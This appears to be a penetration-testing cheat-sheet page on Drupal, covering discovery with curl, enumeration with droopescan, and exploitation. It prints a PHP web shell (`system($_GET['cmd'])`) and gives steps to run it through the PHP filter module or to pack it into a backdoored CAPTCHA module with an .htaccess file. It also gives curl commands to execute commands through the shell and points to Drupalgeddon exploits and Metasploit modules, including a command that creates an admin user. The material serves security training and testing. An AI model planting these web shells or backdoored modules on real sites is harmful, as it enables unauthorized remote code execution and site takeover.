# Drupal

{% hint style="info" %}
* Open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there's no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules.
* Drupal supports three types of users by default:
  1. `Administrator`: This user has complete control over the Drupal website.
  2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
  3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.
{% endhint %}

## Discovery

* Drupal website can be identified in several ways, including by the header or footer message `Powered by Drupal`, the standard Drupal logo
* The presence of a `CHANGELOG.txt` file or `README.txt file`, via the page source, or clues in the robots.txt file such as references to `/node`.
* Newer installs of Drupal by default block access to the `CHANGELOG.txt` and `README.txt` files.
* `curl -s http://<URL> | grep Drupal`&#x20;
* `curl -s http://<URL>/CHANGELOG.txt | grep -m2 ""`
* Drupal indexes its content using [nodes](https://www.drupal.org/docs/8/core/modules/node/about-nodes). A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`.

## Enumeration

* [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal.
  * `droopescan scan drupal -u http://<URL>`&#x20;

## Exploitation

### Leverage PHP Filter Module <a href="#leveraging-the-php-filter-module" id="leveraging-the-php-filter-module"></a>

* In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."
* Tick the check box next to the module and scroll down to `Save configuration`. Go to Content --> Add content and create a `Basic page` .
* Create a page with a malicious PHP snippet
  * `<? php     system($_GET['cmd']);     ?>`&#x20;
* Make sure to set `Text format` drop-down to `PHP code`.
* To leverage  [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module, we would have to install the module ourselves.
* Once downloaded go to `Administration` > `Reports` > `Available updates`.
* Click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.
* Make sure to select `PHP code` from the `Text format` dropdown.
  * `curl -s http://<url>/node/3?cmd=id | grep uid | cut -f4 -d">"`

### Upload a Backdoored Module <a href="#uploading-a-backdoored-module" id="uploading-a-backdoored-module"></a>

* Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module.
* Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha).&#x20;
  * `<? php     system($_GET['cmd']);     ?>`  <sup><sub>(Save as shell.php)<sub></sup>
* We need to create a .htaccess file to give ourselves access to the folder. Necessary as Drupal denies direct access to the /modules folder.
  * `<IfModule mod_rewrite.c>`    \
    `RewriteEngine On`    \
    `RewriteBase /`\
    `</IfModule>`&#x20;
* `Create a folder 'captcha'`
* `mv shell.php .htaccess captcha`&#x20;
* `tar cvf captcha.tar.gz captcha/`&#x20;
* Click on `Manage` and then `Extend` on the sidebar. Click on the `+ Install new module` button. Browse to the backdoored Captcha archive and click `Install`. <sup><sub>(admin access required)<sub></sup>
  * `curl -s <url>/modules/captcha/shell.php?cmd=id`&#x20;

### Automated Exploitation

* [Drupalgeddon](https://www.exploit-db.com/exploits/34992)
  * Affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
  * We could also use the [exploit/multi/http/drupal\_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/) Metasploit module.
  * `python2.7 drupalgeddon.py -t http://<URL> -u hacker -p pwnd`&#x20;
* [Drupalgeddon2](https://www.exploit-db.com/exploits/44448)
  * Remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
* [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)
  * Authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node.
  * Use `exploit/multi/http/drupal_drupageddon3` metasploit module

### Leveraging Known Vulnerabilities <a href="#leveraging-known-vulnerabilities" id="leveraging-known-vulnerabilities"></a>
